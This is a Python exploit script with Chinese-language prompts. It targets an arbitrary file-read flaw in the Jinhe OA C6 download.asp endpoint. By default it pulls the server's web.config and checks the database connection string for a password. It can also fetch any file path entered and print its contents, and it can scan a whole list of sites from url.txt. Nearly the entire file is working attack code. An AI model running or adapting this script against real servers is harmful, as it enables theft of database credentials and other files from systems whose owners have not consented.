import requests
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def requests_test(url):
    headers = {
        "user-angent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    r = requests.get(url,headers=headers,timeout=30)
    return r.text

def read_file(url):
    poc_get = input("请输入想要读取的文件路径(默认为/c6/web.config):")
    if poc_get == "":
        poc = "/c6/web.config"
        poc = "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=" + poc
        try:
            text = requests_test(url + poc)
            soup = BeautifulSoup(text, "xml")
            result = soup.select("add")[1].get("connectionString")
            if "password" in result:
                print("[+] %s 存在漏洞" % url.strip("\n"))
            else:
                print("[-] %s 不存在漏洞" % url.strip("\n"))
        except Exception as e:
            print("[*] web.config文件不存在")
    else:
        poc = poc_get
        poc = "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=" + poc
        try:
            headers = {
                "user-angent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
            }
            r = requests.get(url+poc, headers=headers, timeout=30)
            if r.status_code == 200:
                print("[+] %s 存在漏洞,文件内容为: %s" % (url.strip("\n"), r.text))
            else:
                print("[-] %s 不存在漏洞或文件不存在" % url.strip("\n"))
        except Exception as e:
            print("[*] %s 文件读取失败" % url.strip("\n"))


def read_file_list(filename):
    poc_get = input("请输入想要读取的文件路径(默认为/c6/web.config):")
    if poc_get == "":
        poc = "/c6/web.config"
        with open(filename, 'r', encoding="utf-8")as e:
            lines = e.readlines()
            # print(lines)
            poc = "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=" + poc
            for line in lines:
                url = str(line).strip("\n") + poc
                try:
                    text = requests_test(url)
                    soup = BeautifulSoup(text, "xml")
                    result = soup.select("add")[1].get("connectionString")
                    if "password" in result:
                        print("[+] %s 存在漏洞" % url.strip("\n"))
                    else:
                        print("[-] %s 不存在漏洞" % url.strip("\n"))
                except Exception as e:
                    print("[*] %s 文件读取失败" % url.strip("\n"))
    else:
        poc = poc_get
        with open(filename, 'r', encoding="utf-8")as e:
            lines = e.readlines()
            # print(lines)
            poc = "/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=" + poc
            for line in lines:
                url = str(line).strip("\n") + poc
                try:
                    headers = {
                        "user-angent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
                    }
                    r = requests.get(url, headers=headers, timeout=30)
                    if r.status_code == 200:
                        print("[+] %s 存在漏洞,文件内容为: %s" % (url.strip("\n"),r.text))
                    else:
                        print("[-] %s 不存在漏洞或文件不存在" % url.strip("\n"))
                except Exception as e:
                    print("[*] %s 文件读取失败" % url.strip("\n"))

def main():
    filename = "url.txt"
    print("请输入序号进行选择：")
    print("1、单站点验证")
    print("2、批量站点验证")
    numb = input()
    if numb == "1":
        url = input("请输入url：")
        read_file(url)
    else:
        print("请确认脚本当前路径下存在url.txt文件")
        read_file_list(filename)

main()
